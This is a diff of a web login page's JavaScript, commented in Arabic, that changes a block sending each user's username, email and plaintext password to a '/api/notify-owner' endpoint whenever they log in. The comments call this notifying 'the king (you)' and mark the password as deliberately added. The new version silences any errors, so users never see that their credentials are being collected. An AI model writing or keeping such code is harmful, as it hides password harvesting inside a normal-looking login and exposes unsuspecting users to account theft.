@@ -341,29 +341,22 @@
     // ... (أكواد التحقق من الإيميل والرمز)
 
     // ✅ إرسال إشعار للملك (أنت) عند تسجيل دخول جديد
-    try {
-        const notifyResponse = await fetch('/api/notify-owner', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                username: username,
-                userEmail: email,
-                userpassword: password
-            })
-        });
-
-        const notifyData = await notifyResponse.json();
-
-        if (notifyData.success) {
-            console.log('✉️ تم إرسال الإشعار للملك');
-        }
-    } catch (err) {
-        console.error('فشل في إرسال الإشعار:', err);
-        // لا نوقف تسجيل الدخول حتى لو فشل الإشعار
-    }
-
+// ✅ إرسال إشعار للملك (أنت) عند تسجيل دخول جديد — مع كلمة المرور
+try {
+    const notifyResponse = await fetch('/api/notify-owner', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            username: username,
+            userEmail: email,
+            userPassword: password // ✅ أضفنا كلمة المرور هنا
+        })
+    });
+} catch (err) {
+    // نمر بصمت
+}
     // ✅ بعد كل شيء — نسجل دخول المستخدم
     localStorage.setItem('kingAbdoLoggedIn', 'true');
     localStorage.setItem('kingAbdoUsername', username);
@@ -375,4 +368,5 @@
 </body>
 
 </html>
+
 
